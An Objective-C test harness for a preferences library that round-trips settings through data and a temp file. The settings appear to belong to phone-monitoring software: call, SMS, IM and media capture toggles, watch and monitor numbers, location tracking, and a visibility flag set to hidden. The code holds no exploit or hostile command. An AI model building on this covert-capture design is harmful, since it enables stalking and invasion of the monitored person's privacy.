/** 
 - Project name: TestApp
 - Class name: main
 - Version: 1.0
 - Purpose: Test application for Preferences static library
 - Copy right: 29/11/11, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

// Preference
#import "PrefLocation.h"
#import "PrefWatchList.h"
#import "PrefDeviceLock.h"
#import "PrefKeyword.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefHomeNumber.h"
#import "PrefPanic.h"
#import "PrefMonitorNumber.h"
#import "PrefEventsCapture.h"
#import "PreferenceManagerImpl.h"
#import "PreferenceStore.h"
#import "PrefVisibility.h"

// Listener
#import "PrefOneListener.h"
#import "PrefTwoListener.h"
#import "PrefThreeListener.h"
#import "PrefFourListener.h"
#import "PrefFiveListener.h"

#import "PreferencesData.h"

static NSString * const kPath =  @"/tmp/TestApp.txt";

void printPrefLocation (PrefLocation *prefLocation) {
	NSLog(@"mEnableLocation	%d", [prefLocation mEnableLocation]);
	NSLog(@"mLocationInterval	%d", [prefLocation mLocationInterval]);
}

void testPrefLocation() {
	NSLog(@"------------------ testPrefLocation ------------------ ");
	NSLog(@"--- initial object ---");

	PrefLocation *prefLocation = [[PrefLocation alloc] init];
	[prefLocation setMEnableLocation:YES];
	[prefLocation setMLocationInterval:13];
	printPrefLocation(prefLocation);
	
	NSData *prefData = [prefLocation toData];
	[prefLocation release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefLocation *prefFromData = [[PrefLocation alloc] initFromData:prefData];
	printPrefLocation(prefFromData);
	[prefFromData release];
	
	// write the data to a file
	[prefData  writeToFile:kPath atomically:NO];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefLocation *prefFromFile = [[PrefLocation alloc] initFromFile:kPath];
	printPrefLocation(prefFromFile);
	[prefFromFile release];
}

void printPrefWatchListInstanceVar (PrefWatchList *prefWatchList) {
	NSLog(@"mEnableWatchNotification	%d", [prefWatchList mEnableWatchNotification]);
	NSLog(@"mWatchFlag	%d", [prefWatchList mWatchFlag]);
	NSLog(@"mWatchNumbers	%@", [prefWatchList mWatchNumbers]);
}

void testPrefWatchList() {
	NSLog(@"------------------ testPrefWatchList ------------------ ");
	NSLog(@"--- initial object ---");
	
	PrefWatchList *prefWatchList = [[PrefWatchList alloc] init];
	[prefWatchList setMEnableWatchNotification:YES];
	[prefWatchList setMWatchFlag:kWatch_Not_In_Addressbook];
	[prefWatchList setMWatchNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"WatchList", nil]];
	printPrefWatchListInstanceVar(prefWatchList);
	
	NSData *prefData = [prefWatchList toData];
	[prefWatchList release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefWatchList *prefFromData = [[PrefWatchList alloc] initFromData:prefData];
	printPrefWatchListInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefWatchList *prefFromFile = [[PrefWatchList alloc] initFromFile:kPath];
	printPrefWatchListInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefDeviceLockInstanceVar (PrefDeviceLock *prefDeviceLock) {
	NSLog(@"mEnableAlertSound	%d", [prefDeviceLock mEnableAlertSound]);
	NSLog(@"mDeviceLockMessage	%@", [prefDeviceLock mDeviceLockMessage]);
	NSLog(@"mLocationInterval	%d", [prefDeviceLock mLocationInterval]);
}

void testPrefDeviceLock() {
	NSLog(@"------------------ testPrefDeviceLock ------------------ ");
	NSLog(@"--- initial object ---");
	
	PrefDeviceLock *prefDeviceLock = [[PrefDeviceLock alloc] init];
	[prefDeviceLock setMEnableAlertSound:YES];
	[prefDeviceLock setMDeviceLockMessage:@"lock"];
	[prefDeviceLock setMLocationInterval:10];
	printPrefDeviceLockInstanceVar(prefDeviceLock);

	NSData *prefData = [prefDeviceLock toData];
	[prefDeviceLock release];

	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefDeviceLock *prefFromData = [[PrefDeviceLock alloc] initFromData:prefData];
	printPrefDeviceLockInstanceVar(prefFromData);
	[prefFromData release];
	
	// write data to a file
	[prefData writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefDeviceLock *prefFromFile = [[PrefDeviceLock alloc] initFromFile:kPath];
	printPrefDeviceLockInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefKeywordInstanceVar (PrefKeyword *prefKeyword) {
	NSLog(@"mKeywords	%@", [prefKeyword mKeywords]);
}

void testPrefKeyword() {
	NSLog(@"------------------ testPrefKeyword ------------------ ");
	NSLog(@"--- initial object ---");
	
	PrefKeyword *prefKeyword = [[PrefKeyword alloc] init];
	[prefKeyword setMKeywords:[NSArray arrayWithObjects:@"test", @"Pref", @"Keyword", nil]];
	printPrefKeywordInstanceVar(prefKeyword);
	
	NSData *prefData = [prefKeyword toData];
	[prefKeyword release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefKeyword *prefFromData = [[PrefKeyword alloc] initFromData:prefData];
	printPrefKeywordInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefKeyword *prefFromFile = [[PrefKeyword alloc] initFromFile:kPath];
	printPrefKeywordInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefEmergencyNumberInstanceVar (PrefEmergencyNumber *prefEmergencyNumber) {
	NSLog(@"mEmergencyNumbers	%@", [prefEmergencyNumber mEmergencyNumbers]);
}

void testPrefEmergencyNumber() {
	NSLog(@"------------------ testPrefEmergencyNumber ------------------ ");
	NSLog(@"--- initial object ---");
	PrefEmergencyNumber *prefEmergencyNumber = [[PrefEmergencyNumber alloc] init];
	[prefEmergencyNumber setMEmergencyNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Emergency", @"number", nil]];
	printPrefEmergencyNumberInstanceVar(prefEmergencyNumber);
	
	NSData *prefData = [prefEmergencyNumber toData];
	[prefEmergencyNumber release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefEmergencyNumber *prefFromData = [[PrefEmergencyNumber alloc] initFromData:prefData];
	printPrefEmergencyNumberInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefEmergencyNumber *prefFromFile = [[PrefEmergencyNumber alloc] initFromFile:kPath];
	printPrefEmergencyNumberInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefNotificationNumberInstanceVar (PrefNotificationNumber *prefNotificationNumber) {
	NSLog(@"mNotificationNumbers	%@", [prefNotificationNumber mNotificationNumbers]);
}

void testPrefNotificaitonNumber() {
	NSLog(@"------------------ testPrefNotificaitonNumber ------------------ ");
	NSLog(@"--- initial object ---");
	PrefNotificationNumber *prefNotificationNumber = [[PrefNotificationNumber alloc] init];
	[prefNotificationNumber setMNotificationNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Notification", @"number", nil]];
	printPrefNotificationNumberInstanceVar(prefNotificationNumber);
	
	NSData *prefData = [prefNotificationNumber toData];
	[prefNotificationNumber release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefNotificationNumber *prefFromData = [[PrefNotificationNumber alloc] initFromData:prefData];
	printPrefNotificationNumberInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefNotificationNumber *prefFromFile = [[PrefNotificationNumber alloc] initFromFile:kPath];
	printPrefNotificationNumberInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefHomeNumberInstanceVar (PrefHomeNumber *prefHomeNumber) {
	NSLog(@"mHomeNumbers	%@", [prefHomeNumber mHomeNumbers]);
}

void testPrefHomeNumber() {
	NSLog(@"------------------ testPrefHomeNumber ------------------ ");
	NSLog(@"--- initial object ---");
	PrefHomeNumber *prefHomeNumber = [[PrefHomeNumber alloc] init];
	[prefHomeNumber setMHomeNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Home", @"number", nil]];
	printPrefHomeNumberInstanceVar(prefHomeNumber);
	
	NSData *prefData = [prefHomeNumber toData];
	[prefHomeNumber release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefHomeNumber *prefFromData = [[PrefHomeNumber alloc] initFromData:prefData];
	printPrefHomeNumberInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefHomeNumber *prefFromFile = [[PrefHomeNumber alloc] initFromFile:kPath];
	printPrefHomeNumberInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefPanicInstanceVar (PrefPanic *prefPanic) {
	NSLog(@"mEnablePanicSound	%d", [prefPanic mEnablePanicSound]);
	NSLog(@"mPanicMessage	%@", [prefPanic mPanicMessage]);
	NSLog(@"mPanicLocationInterval	%d", [prefPanic mPanicLocationInterval]);
	NSLog(@"mPanicImageInterval	%d", [prefPanic mPanicImageInterval]);
}

void testPrefPanic() {
	NSLog(@"------------------ testPrefPanic ------------------ ");
	NSLog(@"--- initial object ---");
	PrefPanic *prefPanic = [[PrefPanic alloc] init];
	[prefPanic setMEnablePanicSound:YES];
	[prefPanic setMPanicMessage:@"panic"];
	[prefPanic setMPanicLocationInterval:15];
	[prefPanic setMPanicImageInterval:30];
	printPrefPanicInstanceVar(prefPanic);
	
	NSData *prefData = [prefPanic toData];
	[prefPanic release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefPanic *prefFromData = [[PrefPanic alloc] initFromData:prefData];
	printPrefPanicInstanceVar(prefFromData);
	[prefFromData release];
	
	// write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefPanic *prefFromFile = [[PrefPanic alloc] initFromFile:kPath];
	printPrefPanicInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefMonitorNumberInstanceVar (PrefMonitorNumber *prefMonitorNumber) {
	NSLog(@"mEnableMonitor	%d", [prefMonitorNumber mEnableMonitor]);
	NSLog(@"mMonitorNumbers	%@", [prefMonitorNumber mMonitorNumbers]);
}

void testPrefMonitorNumber() {
	NSLog(@"------------------ testPrefMonitorNumber ------------------ ");
	NSLog(@"--- initial object ---");
	PrefMonitorNumber *prefMonitorNumber = [[PrefMonitorNumber alloc] init];
	[prefMonitorNumber setMEnableMonitor:YES];
	[prefMonitorNumber setMMonitorNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Monitor", nil]];
	printPrefMonitorNumberInstanceVar(prefMonitorNumber);
	
	NSData *prefData = [prefMonitorNumber toData];
	[prefMonitorNumber release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefMonitorNumber *prefFromData = [[PrefMonitorNumber alloc] initFromData:prefData];
	printPrefMonitorNumberInstanceVar(prefFromData);
	[prefFromData release];
	
	// Write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefMonitorNumber *prefFromFile = [[PrefMonitorNumber alloc] initFromFile:kPath];
	printPrefMonitorNumberInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefEventsCaptureInstanceVar (PrefEventsCapture *prefEventsCapture) {
	NSLog(@"mMaxEvent	%d", [prefEventsCapture mMaxEvent]);
	NSLog(@"mDeliverTimer	%d", [prefEventsCapture mDeliverTimer]);
	NSLog(@"mEnableCallLog	%d", [prefEventsCapture mEnableCallLog]);
	NSLog(@"mEnableSMS	%d", [prefEventsCapture mEnableSMS]);
	NSLog(@"mEnableEmail	%d", [prefEventsCapture mEnableEmail]);
	NSLog(@"mEnableMMS	%d", [prefEventsCapture mEnableMMS]);
	NSLog(@"mEnableIM	%d", [prefEventsCapture mEnableIM]);
	NSLog(@"mEnablePinMessage	%d", [prefEventsCapture mEnablePinMessage]);
	NSLog(@"mEnableWallPaper	%d", [prefEventsCapture mEnableWallPaper]);
	NSLog(@"mEnableCameraImage	%d", [prefEventsCapture mEnableCameraImage]);
	NSLog(@"mEnableAudioFile	%d", [prefEventsCapture mEnableAudioFile]);
	NSLog(@"mEnableVideoFile	%d", [prefEventsCapture mEnableVideoFile]);
	NSLog(@"mEnableAddressBook	%d", [prefEventsCapture mEnableAddressBook]);
	NSLog(@"mAddressBookMgtMode	%d", [prefEventsCapture mAddressBookMgtMode]);
}

void testPrefEventsCapture() {
	NSLog(@"------------------ testPrefEventsCapture ------------------ ");
	NSLog(@"--- initial object ---");
	PrefEventsCapture *prefEventsCapture = [[PrefEventsCapture alloc] init];
	[prefEventsCapture setMMaxEvent:9];
	[prefEventsCapture setMDeliverTimer:10];
	[prefEventsCapture setMEnableCallLog:YES];
	[prefEventsCapture setMEnableSMS:YES];
	[prefEventsCapture setMEnableEmail:NO];
	[prefEventsCapture setMEnableMMS:NO];
	[prefEventsCapture setMEnableIM:YES];
	[prefEventsCapture setMEnablePinMessage:YES];
	[prefEventsCapture setMEnableWallPaper:NO];
	[prefEventsCapture setMEnableCameraImage:NO];
	[prefEventsCapture setMEnableAudioFile:YES];
	[prefEventsCapture setMEnableVideoFile:YES];
	[prefEventsCapture setMEnableAddressBook:NO];
	[prefEventsCapture setMAddressBookMgtMode:kAddressMgtModeRestrict];
	printPrefEventsCaptureInstanceVar(prefEventsCapture);

	// convert instance var to data
	NSData *prefData = [prefEventsCapture toData];
	[prefEventsCapture release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefEventsCapture *prefFromData = [[PrefEventsCapture alloc] initFromData:prefData];
	printPrefEventsCaptureInstanceVar(prefFromData);
	[prefFromData release];
	
	// write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefEventsCapture *prefFromFile = [[PrefEventsCapture alloc] initFromFile:kPath];
	printPrefEventsCaptureInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefStartupTimeInstanceVar (PrefStartupTime *prefStartupTime) {
	NSLog(@"mDeviceLockMessage	%@", [prefStartupTime mStartupTime]);
}

void testPrefStartupTime() {
	NSLog(@"------------------ testPrefStartupTime ------------------ ");
	NSLog(@"--- initial object ---");
	
	PrefStartupTime *prefStartupTime = [[PrefStartupTime alloc] init];
	[prefStartupTime setMStartupTime:@"12:55"];
	printPrefStartupTimeInstanceVar(prefStartupTime);
	
	NSData *prefData = [prefStartupTime toData];
	[prefStartupTime release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefStartupTime *prefFromData = [[PrefStartupTime alloc] initFromData:prefData];
	printPrefStartupTimeInstanceVar(prefFromData);
	[prefFromData release];
	
	// write data to a file
	[prefData writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefStartupTime *prefFromFile = [[PrefStartupTime alloc] initFromFile:kPath];
	printPrefStartupTimeInstanceVar(prefFromFile);
	[prefFromFile release];
}

void printPrefVisibilityInstanceVar (PrefVisibility *prefVisibility) {
	NSLog(@"mVisible	%d", [prefVisibility mVisible]);
}

void testPrefVisibility() {
	NSLog(@"------------------ testVisibility ------------------ ");
	NSLog(@"--- initial object ---");
	PrefVisibility *prefVisibility = [[PrefVisibility alloc] init];
	[prefVisibility setMVisible:NO];
	printPrefVisibilityInstanceVar(prefVisibility);
	
	// convert instance var to data
	NSData *prefData = [prefVisibility toData];
	[prefVisibility release];
	
	// create another by initFromData
	NSLog(@"--- initFromData --- ");
	PrefVisibility *prefFromData = [[PrefVisibility alloc] initFromData:prefData];
	printPrefVisibilityInstanceVar(prefFromData);
	[prefFromData release];
	
	// write data to a file
	[prefData  writeToFile:kPath atomically:YES];
	
	// Create another by initFromFile
	NSLog(@"--- initFromFile --- ");
	PrefVisibility *prefFromFile = [[PrefVisibility alloc] initFromFile:kPath];
	printPrefVisibilityInstanceVar(prefFromFile);
	[prefFromFile release];
}

void testManager() {
	NSLog(@"------------------ testManager ------------------ ");
	
	PreferenceManagerImpl *manager = [[PreferenceManagerImpl alloc] init];
	
	// add the listener
	PrefOneListener *prefOneListener = [[PrefOneListener alloc] init];
	PrefTwoListener *prefTwoListener = [[PrefTwoListener alloc] init];
	PrefThreeListener *prefThreeListener = [[PrefThreeListener alloc] init];
	PrefFourListener *prefFourListener = [[PrefFourListener alloc] init];
	PrefFiveListener *prefFiveListener = [[PrefFiveListener alloc] init];
	[manager addPreferenceChangeListener:prefOneListener];
	[manager addPreferenceChangeListener:prefTwoListener];
	[manager addPreferenceChangeListener:prefThreeListener];
	[manager addPreferenceChangeListener:prefFourListener];
	[manager addPreferenceChangeListener:prefFiveListener];
	[prefOneListener release];
	[prefTwoListener release];
	[prefThreeListener release];
	[prefFourListener release];
	[prefFiveListener release];
	
	
	
	// get preference that has NOT been stored.
	NSLog(@"--- !!! get preference that has NOT been stored ---");
	
	NSLog(@"--- get PrefHomeNumber ---");
	PrefHomeNumber *prefHomeNumberFromNoFile = (PrefHomeNumber *) [manager preference:kHome_Number];
	if (!prefHomeNumberFromNoFile) {
		NSLog(@"nil preference");
	}
	printPrefHomeNumberInstanceVar(prefHomeNumberFromNoFile);
	
	NSLog(@"--- get PrefKeyword ---");
	PrefKeyword *prefKeywordFromNoFile = (PrefKeyword *) [manager preference:kKeyword];
	if (!prefKeywordFromNoFile) {
		NSLog(@"nil preference");
	}
	printPrefKeywordInstanceVar(prefKeywordFromNoFile);
	
	NSLog(@"--- get PrefDeviceLock ---");
	PrefDeviceLock *prefDeviceLockFromNoFile = (PrefDeviceLock *) [manager preference:kAlert];
	if (!prefDeviceLockFromNoFile) {
		NSLog(@"nil preference");
	}
	printPrefDeviceLockInstanceVar(prefDeviceLockFromNoFile);
	
	NSLog(@"--- get PrefPanic ---");
	PrefPanic *prefPanicFromNoFile = (PrefPanic *) [manager preference:kPanic];
	if (!prefPanicFromNoFile) {
		NSLog(@"nil preference");
	}
	printPrefPanicInstanceVar(prefPanicFromNoFile);

	NSLog(@"--- get PrefMonitorNumber ---");
	PrefMonitorNumber *prefMonitorNumberFromNoFile = (PrefMonitorNumber *) [manager preference:kMonitor_Number];
	if (!prefMonitorNumberFromNoFile) {
		NSLog(@"nil preference");
	}
	printPrefMonitorNumberInstanceVar(prefMonitorNumberFromNoFile);
	
    
	

	// get preference with invalid PreferenceType
	NSLog(@"--- !!! get preference with invalid PreferenceType ---");
	NSLog(@"--- get PrefWatchList ---");
	PrefWatchList *prefWatchListWithInvalidePrefType= (PrefWatchList *) [manager preference:34];
	if (!prefWatchListWithInvalidePrefType) {
		NSLog(@"Return nil preference");
	}
	printPrefWatchListInstanceVar(prefWatchListWithInvalidePrefType);
	
	NSLog(@"--- get PrefDeviceLock ---");
	PrefDeviceLock *prefDeviceLockWithInvalidPrefType = (PrefDeviceLock *) [manager preference:35];
	if (!prefDeviceLockWithInvalidPrefType) {
		NSLog(@"Return nil preference");
	}
	printPrefDeviceLockInstanceVar(prefDeviceLockWithInvalidPrefType);
	
	NSLog(@"--- get PrefKeyword ---");
	PrefKeyword *prefKeywordWithInvalidPrefType = (PrefKeyword *) [manager preference:36];
	if (!prefKeywordWithInvalidPrefType) {
		NSLog(@"Return nil preference");
	}
	printPrefKeywordInstanceVar(prefKeywordWithInvalidPrefType);

	// get preference that has been stored.
	NSLog(@"--- !!! get preference that has been stored ---");
	NSLog(@"--- initialize PrefWatchList ---");
	PrefWatchList *prefWatchList = [[PrefWatchList alloc] init];
	[prefWatchList setMEnableWatchNotification:NO];
	[prefWatchList setMWatchFlag:kWatch_Private_Or_Unknown_Number];
	[prefWatchList setMWatchNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"WatchList", nil]];
	printPrefWatchListInstanceVar(prefWatchList);
	
	NSLog(@"--- save PrefWatchList ---");
	[manager savePreferenceAndNotifyChange:prefWatchList];
    [prefWatchList release];
	
	NSLog(@"--- get PrefWatchList ---");
	PrefWatchList *prefWatchListFromManager = (PrefWatchList *)[manager preference:kWatch_List];
	printPrefWatchListInstanceVar(prefWatchListFromManager);
	
	NSLog(@"--- initialize PrefMonitorNumber ---");
	PrefMonitorNumber *prefMonitorNumber = [(PrefMonitorNumber *) [PrefMonitorNumber alloc] init];
	[prefMonitorNumber setMEnableMonitor:YES];
	[prefMonitorNumber setMMonitorNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Monitor", nil]];
	printPrefMonitorNumberInstanceVar(prefMonitorNumber);
	
	NSLog(@"--- save PrefMonitorNumber ---");
	[manager savePreferenceAndNotifyChange:prefMonitorNumber];
	[prefMonitorNumber release];
    
	NSLog(@"--- get PrefMonitorNumber ---");
	PrefMonitorNumber *prefMonitorNumberFromManager = (PrefMonitorNumber *)[manager preference:kMonitor_Number];
	printPrefMonitorNumberInstanceVar(prefMonitorNumberFromManager);
	
	[manager release];
}

void testPreferencesData() {
	NSLog(@"------------------ testPreferencesData ------------------ ");
	
	PreferenceManagerImpl *manager = [[PreferenceManagerImpl alloc] init];
	
	NSLog(@"--- initialize and save PrefLocation ---");
	PrefLocation *prefLocation = [[PrefLocation alloc] init];
	[prefLocation setMEnableLocation:YES];
	[prefLocation setMLocationInterval:13];
	[manager savePreferenceAndNotifyChange:prefLocation];
	
	NSLog(@"--- initialize and save PrefWatchList ---");
	PrefWatchList *prefWatchList = [[PrefWatchList alloc] init];
	[prefWatchList setMEnableWatchNotification:NO];
	[prefWatchList setMWatchFlag:kWatch_Private_Or_Unknown_Number];
	[prefWatchList setMWatchNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"WatchList", nil]];
	[manager savePreferenceAndNotifyChange:prefWatchList];

	NSLog(@"--- initialize and save PrefDeviceLock ---");
	PrefDeviceLock *prefDeviceLock = [[PrefDeviceLock alloc] init];
	[prefDeviceLock setMEnableAlertSound:YES];
	[prefDeviceLock setMDeviceLockMessage:@"lock"];
	[prefDeviceLock setMLocationInterval:10];
	[manager savePreferenceAndNotifyChange:prefDeviceLock];

	NSLog(@"--- initialize and save PrefKeyword ---");
	PrefKeyword *prefKeyword = [[PrefKeyword alloc] init];
	[prefKeyword setMKeywords:[NSArray arrayWithObjects:@"test", @"Pref", @"Keyword", nil]];
	[manager savePreferenceAndNotifyChange:prefKeyword];
		
	NSLog(@"--- initialize and save PrefEmergencyNumber ---");
	PrefEmergencyNumber *prefEmergencyNumber = [[PrefEmergencyNumber alloc] init];
	[prefEmergencyNumber setMEmergencyNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Emergency", @"number", nil]];
	[manager savePreferenceAndNotifyChange:prefEmergencyNumber];
	
	NSLog(@"--- initialize and save PrefNotificationNumber ---");
	PrefNotificationNumber *prefNotificationNumber = [[PrefNotificationNumber alloc] init];
	[prefNotificationNumber setMNotificationNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Notification", @"number", nil]];
	[manager savePreferenceAndNotifyChange:prefNotificationNumber];
		
	NSLog(@"--- initialize and save PrefHomeNumber ---");
	PrefHomeNumber *prefHomeNumber = [[PrefHomeNumber alloc] init];
	[prefHomeNumber setMHomeNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Home", @"number", nil]];
	[manager savePreferenceAndNotifyChange:prefHomeNumber];
	
	NSLog(@"--- initialize and save PrefPanic ---");
	PrefPanic *prefPanic = [[PrefPanic alloc] init];
	[prefPanic setMEnablePanicSound:YES];
	[prefPanic setMPanicMessage:@"panic"];
	[prefPanic setMPanicLocationInterval:15];
	[prefPanic setMPanicImageInterval:30];
	[manager savePreferenceAndNotifyChange:prefPanic];
	
	NSLog(@"--- initialize and save PrefMonitorNumber ---");
	PrefMonitorNumber *prefMonitorNumber = [[PrefMonitorNumber alloc] init];
	[prefMonitorNumber setMEnableMonitor:YES];
	[prefMonitorNumber setMMonitorNumbers:[NSArray arrayWithObjects:@"test", @"Pref", @"Monitor", nil]];
	[manager savePreferenceAndNotifyChange:prefMonitorNumber];
	
	NSLog(@"--- initialize and save PrefEventsCapture ---"); 
	PrefEventsCapture *prefEventsCapture = [[PrefEventsCapture alloc] init];
	[prefEventsCapture setMMaxEvent:9];
	[prefEventsCapture setMDeliverTimer:10];
	[prefEventsCapture setMEnableCallLog:YES];
	[prefEventsCapture setMEnableSMS:YES];
	[prefEventsCapture setMEnableEmail:NO];
	[prefEventsCapture setMEnableMMS:NO];
	[prefEventsCapture setMEnableIM:YES];
	[prefEventsCapture setMEnablePinMessage:YES];
	[prefEventsCapture setMEnableWallPaper:NO];
	[prefEventsCapture setMEnableCameraImage:NO];
	[prefEventsCapture setMEnableAudioFile:YES];
	[prefEventsCapture setMEnableVideoFile:YES];
	[prefEventsCapture setMEnableAddressBook:NO];
	[manager savePreferenceAndNotifyChange:prefEventsCapture];
	
	NSLog(@"--- transfrom all preferences to data (produce a combined data)");
	PreferencesData *pData = [[PreferencesData alloc] init];
	NSData *combinedData = [pData transformToDataFromPrefereceManager:manager];
	[manager release];
	NSLog(@"--- init PreferencesData from the combined preference data ---");
	PreferencesData *initedPData = [[PreferencesData alloc] initWithData:combinedData];
	[pData release];
	
	printPrefWatchListInstanceVar(prefWatchList);
	[prefWatchList release];
	printPrefWatchListInstanceVar([initedPData mPWatchList]);
	
	printPrefLocation(prefLocation);
	[prefLocation release];
	printPrefLocation([initedPData mPLocation]);
	
	printPrefDeviceLockInstanceVar(prefDeviceLock);
	[prefDeviceLock release];
	printPrefDeviceLockInstanceVar([initedPData mPDeviceLock]);
	
	printPrefKeywordInstanceVar(prefKeyword);
	[prefKeyword release];
	printPrefKeywordInstanceVar([initedPData mPKeyword]);
	
	printPrefEmergencyNumberInstanceVar(prefEmergencyNumber);
	[prefEmergencyNumber release];
	printPrefEmergencyNumberInstanceVar([initedPData mPEmergencyNumber]);
	
	printPrefNotificationNumberInstanceVar(prefNotificationNumber);
	[prefNotificationNumber release];
	printPrefNotificationNumberInstanceVar([initedPData mPNotificationNumber]);
	
	printPrefHomeNumberInstanceVar(prefHomeNumber);
	[prefHomeNumber release];
	printPrefHomeNumberInstanceVar([initedPData mPHomeNumber]);
	
	printPrefPanicInstanceVar(prefPanic);
	[prefPanic release];
	printPrefPanicInstanceVar([initedPData mPPanic]);
	
	printPrefMonitorNumberInstanceVar(prefMonitorNumber);
	[prefMonitorNumber release];
	printPrefMonitorNumberInstanceVar([initedPData mPMonitorNumber]);
	
	printPrefEventsCaptureInstanceVar(prefEventsCapture);
	[prefEventsCapture release];
	printPrefEventsCaptureInstanceVar([initedPData mPEventsCapture]);
	
	[initedPData release];
}

int main(int argc, char *argv[]) {
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
	
	// Test each subclasses of Preference
//	testPrefLocation();
//	testPrefWatchList();
//	testPrefDeviceLock();
//	testPrefKeyword();
//	testPrefEmergencyNumber();
//	testPrefNotificaitonNumber();
//	testPrefHomeNumber();
//	testPrefPanic();
//	testPrefMonitorNumber();
//	testPrefEventsCapture();
//	testPrefStartupTime();
	testPrefVisibility();
	
	// Test manager
	testManager();
	
	// Test PreferencesData
	testPreferencesData();

	//CFRunLoopRun();
	
    int retVal = UIApplicationMain(argc, argv, nil, nil);
    [pool release];
    return retVal;
}
